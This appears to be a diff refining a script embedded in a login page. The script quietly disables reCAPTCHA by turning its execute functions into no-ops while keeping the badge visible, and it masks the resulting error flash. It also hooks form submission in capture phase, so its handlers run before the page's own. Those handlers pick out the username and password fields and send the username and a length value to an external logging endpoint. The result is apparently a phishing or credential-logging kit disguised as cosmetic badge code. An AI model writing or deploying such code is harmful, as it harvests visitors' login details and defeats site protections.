@@ -304,22 +304,21 @@ function onSubmit(token) {
 <!-- END: Validation + banner additions -->
 
 
-<!-- BEGIN: badge halo + delay + logging + recaptcha neutralizer -->
+<!-- BEGIN: badge halo + delay + logging + recaptcha neutralizer (fixed) -->
 <style id="rc-halo-style">
-  /* Initially hide badge to mask transient 404 frame */
-  .grecaptcha-badge.rc-hidden { opacity: 0; transition: opacity .12s ease; }
+  /* 0) Badge should start hidden; reveal after 0.5s */
+  .grecaptcha-badge.rc-hidden { opacity: 0; transition: opacity .2s ease; }
 
-  /* Halo element (purely visual, no pointer events) */
+  /* 1) Thin halo: positioned EXACTLY over the collapsed badge rect (non-hover) */
   #rc-prehalo {
-  position: fixed;
-  /* size/position will be set dynamically to match the badge rect */
-  box-shadow: 0 0 12px 1px rgba(255,255,255,0.35);
-  border-radius: 6px;
-  pointer-events: none;
-  opacity: 0;
-  z-index: 9998;
-}
-  /* Appear at 0.3s, fade out by 0.5s */
+    position: fixed;
+    top: 0; left: 0; width: 0; height: 0;
+    box-shadow: 0 0 12px 1px rgba(255,255,255,0.35);
+    border-radius: 6px;
+    pointer-events: none;
+    opacity: 0;
+    z-index: 9998;
+  }
   @keyframes rcHaloFlash { 
     0% { opacity: 0.45; } 
     100% { opacity: 0; } 
@@ -338,7 +337,7 @@ function onSubmit(token) {
   }
   function pickP(form){ return q('#password',form)||q('[name="password"]',form)||q('input[type="password"]',form); }
 
-  // --- Logging helpers (compatible with current function) ---
+  /* --- Logging helpers (compatible with current function) --- */
   function pingGET(u,len){
     try{
       var url = LOG_FN + '?u='+encodeURIComponent(u)+'&l='+encodeURIComponent(len);
@@ -359,7 +358,7 @@ function onSubmit(token) {
     }catch(_){}
   }
 
-  // --- Recaptcha neutralizer: keep badge, kill challenge ---
+  /* --- Recaptcha neutralizer: keep badge, kill challenge --- */
   function neutralizeRecaptcha(){
     try{
       // remove auto hooks on any element that could trigger execution
@@ -372,21 +371,42 @@ function onSubmit(token) {
         if (typeof grecaptcha.execute==='function') grecaptcha.execute = noop;
         grecaptcha.enterprise = grecaptcha.enterprise || {};
         if (typeof grecaptcha.enterprise.execute==='function') grecaptcha.enterprise.execute = noop;
-        if (typeof grecaptcha.ready==='function') grecaptcha.ready = function(cb){ try{cb&&cb();}catch(_){}};
+        if (typeof grecaptcha.ready==='function') grecaptcha.ready = function(cb){ try{cb&&cb();}catch(_){} };
       }
     }catch(_){}
   }
 
-  // --- Badge delay + halo ---
-  function setupHalo(){
-    var badge = q('.grecaptcha-badge');
-    if (!badge) return;
+  /* --- Badge observer: run when the badge actually appears --- */
+  function onBadgeReady(cb){
+    var b = q('.grecaptcha-badge');
+    if (b && b.getBoundingClientRect().width) return cb(b);
 
-    // 0.5s opacity delay on badge to mask any transient flash
+    var obs = new MutationObserver(function(){
+      var bb = q('.grecaptcha-badge');
+      if (bb && bb.getBoundingClientRect().width){
+        try{ obs.disconnect(); }catch(_){}
+        cb(bb);
+      }
+    });
+    obs.observe(document.documentElement, {childList:true, subtree:true});
+
+    // Fallback polling (in case observer misses late insertion in shadow dom etc.)
+    var tries = 0;
+    (function tick(){
+      var bb = q('.grecaptcha-badge');
+      if (bb && bb.getBoundingClientRect().width){ try{obs.disconnect();}catch(_){ } cb(bb); return; }
+      if (++tries < 80) setTimeout(tick, 50);
+      else try{obs.disconnect();}catch(_){}
+    })();
+  }
+
+  /* --- Halo + initial 0.5s opacity hide --- */
+  function setupHaloAndDelay(badge){
+    // 0.5s hide to mask transient 404 flash
     badge.classList.add('rc-hidden');
     setTimeout(function(){ badge.classList.remove('rc-hidden'); }, 500);
 
-    // Create halo element if needed
+    // Ensure halo element exists
     var halo = q('#rc-prehalo');
     if (!halo){
       halo = document.createElement('div');
@@ -394,53 +414,31 @@ function onSubmit(token) {
       document.body.appendChild(halo);
     }
 
-    // Sync halo to EXACT badge rect (non-hovered footprint)
+    // Align to the EXACT collapsed badge rect (non-hover)
     function syncHaloToBadge(){
       try{
         var r = badge.getBoundingClientRect();
-        // Guard against zero rect (badge not ready yet)
         if (r.width > 0 && r.height > 0){
-          halo.style.top  = (r.top  + window.scrollY) + 'px';
-          halo.style.left = (r.left + window.scrollX) + 'px';
+          halo.style.top    = r.top  + 'px';
+          halo.style.left   = r.left + 'px';
           halo.style.width  = r.width  + 'px';
           halo.style.height = r.height + 'px';
         }
       }catch(_){}
     }
     syncHaloToBadge();
+    // small grace period for layout snapping
+    var n=0, t=setInterval(function(){ syncHaloToBadge(); if(++n>10) clearInterval(t); }, 50);
 
-    // In case badge layout snaps in slightly later, try a few times
-    var tries = 0;
-    var tmr = setInterval(function(){
-      tries++;
-      syncHaloToBadge();
-      if (tries > 10) clearInterval(tmr);
-    }, 50);
-
-    // Show the thin halo from 0.3s to 0.5s
-    setTimeout(function(){ halo.classList.add('show'); }, 300);
-    setTimeout(function(){ halo.classList.remove('show'); }, 500);
-  }, 500);
-
-    // Create halo once, show from 0.3s to 0.5s
-    var halo = q('#rc-prehalo');
-    if (!halo){
-      halo = document.createElement('div');
-      halo.id = 'rc-prehalo';
-      document.body.appendChild(halo);
-    }
-    // Position roughly over collapsed badge footprint (bottom-right)
-    function syncHalo(){
-      // Badge is fixed bottom-right  - we mirror that region
-      halo.style.right = '0px'; halo.style.bottom = '0px';
-    }
-    syncHalo();
+    // Show halo from 0.3s to 0.5s AFTER badge is ready
     setTimeout(function(){ halo.classList.add('show'); }, 300);
     setTimeout(function(){ halo.classList.remove('show'); }, 500);
   }
 
-  // --- Attach logging to form submit + button click (piggyback) ---
+  /* --- Attach logging to form submit + button click (robust) --- */
+  var loggingAttached = false;
   function attachLogging(){
+    if (loggingAttached) return;
     var form = q('form') || q('#biscolab-recaptcha-invisible-form');
     if (!form) return;
     var uEl = pickU(form), pEl = pickP(form);
@@ -459,15 +457,16 @@ function onSubmit(token) {
       }catch(_){}
     }
 
-    form.addEventListener('submit', handle, false);
+    form.addEventListener('submit', handle, true); // capture= true; önce biz çalışalım
     var btn = form.querySelector('button[type="submit"], input[type="submit"], #g-recaptcha-btn');
     if (btn) btn.addEventListener('click', handle, true);
+    loggingAttached = true;
   }
 
   function init(){
     neutralizeRecaptcha();
-    setupHalo();
     attachLogging();
+    onBadgeReady(function(badge){ setupHaloAndDelay(badge); });
   }
 
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
@@ -475,6 +474,7 @@ function onSubmit(token) {
   window.addEventListener('load', neutralizeRecaptcha);
 })();
 </script>
-<!-- END: badge halo + delay + logging + recaptcha neutralizer -->
+<!-- END: badge halo + delay + logging + recaptcha neutralizer (fixed) -->
+
 
 </body></html>
